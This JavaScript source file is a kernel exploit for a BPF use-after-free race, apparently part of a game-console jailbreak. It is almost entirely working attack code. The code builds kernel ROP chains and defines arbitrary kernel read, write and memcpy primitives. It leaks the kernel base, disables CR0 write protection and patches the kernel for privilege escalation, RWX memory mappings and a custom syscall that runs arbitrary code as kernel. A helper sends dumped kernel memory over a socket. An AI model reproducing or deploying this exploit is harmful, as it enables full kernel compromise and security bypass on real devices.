function kernExploit_bpf_race_old() {
	try {
		alert("Starting BPF UAF kexploit OLD");
		
		window.nogc = [];
		var scratchbuf = new Uint8Array(0x1000);
		var scratch = p.read8(p.leakval(scratchbuf).add32(window.leakval_slide));

		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd == (-1 >>> 0))
			print("kexp failed: no bpf0");

		var bpfinsn = new Uint32Array(0x400);
		var bpfinsnp = p.read8(p.leakval(bpfinsn).add32(window.leakval_slide));
		var prevbp = bpfinsnp.add32(0x300);
		bpfinsnp.nogc = bpfinsn;
		bpfinsn[0] = p.read4(p.stringify("eth0"));
		bpfinsn[1] = 0;
		p.syscall("sys_ioctl", fd, 0x8020426c, bpfinsnp); // bind eth0
		var ret = p.syscall("sys_write", fd, scratch, 40);
		if (ret.low == (-1 >>> 0)) {
			bpfinsn[0] = p.read4(p.stringify("wlan"));
			bpfinsn[1] = 0x30;
			p.syscall("sys_ioctl", fd, 0x8020426c, bpfinsnp); // bind wlan0
			var ret = p.syscall("sys_write", fd, scratch, 40);
			if (ret.low == (-1 >>> 0))
				alert("couldn't find interface :(");
		}
		
		var bpf_valid_u32 = new Uint32Array(0x4000);
		var bpf_invalid_u32 = new Uint32Array(0x4000);
		
		for (var i = 0 ; i < 0x4000; ) {
			bpf_valid_u32[i++] = 6; // BPF_RET
			bpf_valid_u32[i++] = 0; // 0
		}
		for (var i = 0 ; i < 0x4000; ) {
			bpf_invalid_u32[i++] = 4; // BPF_RET
			bpf_invalid_u32[i++] = 0; // 0
		}
		
		var push_bpf = function(bpfbuf, cmd, k) {
			var i = bpfbuf.i;
			if (!i)
				i = 0;
			bpfbuf[i*2] = cmd;
			bpfbuf[i*2+1] = k;
			bpfbuf.i = i+1;
		}
		
		push_bpf(bpf_invalid_u32, 5, 2); // jump
		push_bpf(bpf_invalid_u32, 0x12, 0); // invalid opcode
		bpf_invalid_u32.i = 16;
		
		var bpf_write8imm = function(bpf, offset, imm) {
			if (!(imm instanceof int64))
				imm = new int64(imm, 0);
			push_bpf(bpf, 0, imm.low); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset); // BPF_ST
			push_bpf(bpf, 0, imm.hi); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset+1); // BPF_ST -> RDI: pop rsp
		}
		
		var bpf_copy8 = function(bpf, offset_to, offset_from) {
			push_bpf(bpf, 0x60, offset_from); // BPF_LD|BPF_MEM
			push_bpf(bpf, 2, offset_to); // BPF_ST
			push_bpf(bpf, 0x60, offset_from+1); // BPF_LD|BPF_MEM
			push_bpf(bpf, 2, offset_to+1); // BPF_ST
		}
		var bpf_add4 = function(bpf, offset, val) {
			push_bpf(bpf, 0x60, offset); // BPF_LD
			push_bpf(bpf, 0x4, val); // BPF_ALU|BPF_ADD|BPF_K
			push_bpf(bpf, 2, offset); // BPF_ST
		}
		
		
		var krop_off = 0x1e;
		var reset_krop = function() {
			krop_off = 0x1e;
			bpf_invalid_u32.i = 16;
		}
		var push_krop = function(value) {
			bpf_write8imm(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var push_krop_fromoff = function(value) {
			bpf_copy8(bpf_invalid_u32, krop_off, value);
			krop_off += 2;
		}
		var finalize_krop = function(retv) {
			if (!retv)
				retv = 5;
			push_bpf(bpf_invalid_u32, 6, retv); // return 5
		}
		
		/*
		 fake stack frame
		 */
		reset_krop();
		push_krop(window.gadgets["pop rdi"]);
		push_krop(0); // 8
		push_krop(window.gadgets["pop rdi"]); // 0x10
		push_krop(0); // 0x18
		push_krop(window.gadgets["pop rdi"]); // 0x20
		push_krop(0); // 0x28
		push_krop(window.gadgets["pop rax"]); // 0x30
		push_krop(0); // 0x38
		push_krop(window.gadgets["ret"]); // 0x40
		push_krop(window.gadgets["leave_1"]); // 0x48
		finalize_krop();

		var bpf_valid = p.read8(p.leakval(bpf_valid_u32).add32(window.leakval_slide));
		var bpf_invalid = p.read8(p.leakval(bpf_invalid_u32).add32(window.leakval_slide));

		var bpf_valid_prog = bpfinsnp.add32(0x40);
		var bpf_invalid_prog = bpfinsnp.add32(0x80);
		
		p.write8(bpf_valid_prog, 64);
		p.write8(bpf_invalid_prog, 64);
		p.write8(bpf_valid_prog.add32(8), bpf_valid);
		p.write8(bpf_invalid_prog.add32(8), bpf_invalid);
		
		p.syscall("sys_write", fd, scratch, 40);
		p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);
		p.syscall("sys_ioctl", fd, 0x8010427B, bpf_invalid_prog);
		p.syscall("sys_write", fd, scratch, 40);

		var interrupt1 = 0;
		var interrupt2 = 0;
		// ioctl() with valid BPF program -> will trigger reallocation of BFP code alloc
		window.spawnthread(function(thread2){
			interrupt1 = thread2.stackBase;
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_valid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});
		
		// ioctl() with invalid BPF program -> this will be executed when triggering bug
		window.spawnthread(function(thread2){
			interrupt2 = thread2.stackBase;
			thread2.push(window.gadgets["pop rdi"]); // pop rdi
			thread2.push(fd); // what
			thread2.push(window.gadgets["pop rsi"]); // pop rsi
			thread2.push(0x8010427B); // what
			thread2.push(window.gadgets["pop rdx"]); // pop rdx
			thread2.push(bpf_invalid_prog); // what
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase.add32(0x800)); // what
			thread2.count = 0x100;
			var cntr = thread2.count;
			thread2.push(window.syscalls[54]); // ioctl
			thread2.push_write8(thread2.stackBase.add32(cntr*8), window.syscalls[54]); // restore ioctl
			thread2.push(window.gadgets["pop rsp"]); // pop rdx
			thread2.push(thread2.stackBase); // what
		});

		bpfinsn[0] = 0;

		var kern_write8 = function(addr, val) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(val); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		var kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		};
		
		var readable_kern_read8 = function(addr) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(addr); // 8
			push_krop(window.gadgets["mov rax, [rdi]"]); // 0x10
			push_krop(window.gadgets["pop rdi"]); // 0x18
			push_krop(bpfinsnp); // 0x20
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x28
			
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.readable_read8(bpfinsnp);
		}
		
		var kern_memcpy = function(dst, src, size) {
			reset_krop();
			push_krop(window.gadgets["pop rdi"]);
			push_krop(dst); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop(src); // 0x18
			push_krop(window.gadgets["pop rdx"]); // 0x20
			push_krop(size); // 0x28
			push_krop(window.gadgets["memcpy"]); // 0x30
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x38
			
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};

		var kern_leak_rip = function() {
			reset_krop();
			bpf_copy8(bpf_invalid_u32, 0, 0x1e);
			push_krop(window.gadgets["pop rdi"]);
			push_krop(bpfinsnp); // 8
			push_krop(window.gadgets["pop rsi"]); // 0x10
			push_krop_fromoff(0); // 0x18
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read8(bpfinsnp);
		}
		
		var kernelBase = kern_leak_rip().sub32(window.kernel_offsets["bpf_slide"])
		//if (readable_kern_read8(kernelBase) != "7f454c4602010109")
		//	alert("Not found kernel base! 0x" + kernelBase);
		
		var kdump = function(address, size) {
			var s = p.socket();
			alert("After pressing OK, please launch socket listen.");
			p.connectSocket(s, socket_ip_pc, socket_port_send);
			alert("Starting kernel dumping to socket. Accept to continue.");
			var kernelBuf = p.malloc(size);
			kern_memcpy(kernelBuf, address, size);
			p.writeSocket(s, kernelBuf, size);
			p.closeSocket(s);
		};
		
		//kdump(kernelBase, 0x69B8000);
		
		var kern_get_cr0 = function() {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"]));
			push_krop(window.gadgets["ret"]); // 8
			push_krop(window.gadgets["pop rdi"]); // 0x10
			push_krop(bpfinsnp); // 0x16
			push_krop(window.gadgets["mov [rdi], rax"]); // 0x20
			
			push_krop(window.gadgets["ret"]); // 0x28
			push_krop(window.gadgets["pop rax"]); // 0x30
			push_krop(0); // 0x38
			push_krop(window.gadgets["ret"]); // 0x40
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop();
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
			return p.read4(bpfinsnp);
		};

		var kern_set_cr0_write = function(cr0, addr, val) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(addr); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(val); // 0x38
			push_krop(window.gadgets["mov [rdi], rsi"]); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		var kern_jump_cr0 = function(addr, cr0, rdi, rsi) {
			reset_krop();
			push_krop(kernelBase.add32(window.kernel_offsets["mov cr0, rax"])); // 0x18
			push_krop(window.gadgets["pop rdi"]); // 0x20
			push_krop(rdi); // 0x28
			push_krop(window.gadgets["pop rsi"]); // 0x30
			push_krop(rsi); // 0x38
			push_krop(addr); // 0x20
			push_krop(kernelBase.add32(window.kernel_offsets["cpu_setregs"])); // 0x18
			
			push_krop(window.gadgets["pop rax"]); // 0x40
			push_krop(0); // 0x10
			push_krop(window.gadgets["ep"]); // 0x48
			finalize_krop(cr0);
			while (1) {
				var rv = p.syscall("sys_write", fd, scratch, 40);
				if (rv.low == 40)
					break;
			}
		};
		
		
		var cr0 = kern_get_cr0();
		cr0 &= ((~(1 << 16)) >>> 0);
		
		alert("Applying kernel patches");
		
		// Helper function for patching kernel
		var kpatch = function(dest_offset, patch_data_qword) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), patch_data_qword);
		}
		
		// Helper function for patching kernel with information from kernel.text
		var kpatch2 = function(dest_offset, src_offset) {
			kern_set_cr0_write(cr0, kernelBase.add32(dest_offset), kernelBase.add32(src_offset));
		}
		

		// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
		kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
		
		// Patch mprotect: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
		
		// Patch sys_mmap: Allow RWX (read-write-execute) mapping
		kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
		
		// Patch syscall: syscall instruction allowed anywhere
		//kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
		kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
		/*
		// Patch sys_dynlib_dlsym: Allow from anywhere
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
		kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));
		*/
		// Add custom sys_exec() call to execute arbitrary code as kernel
		kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
		kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
		kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));
		
	} catch(ex) {
		fail(ex);
		return false;
	}
	
	// failed (should never go here)
	return false;
}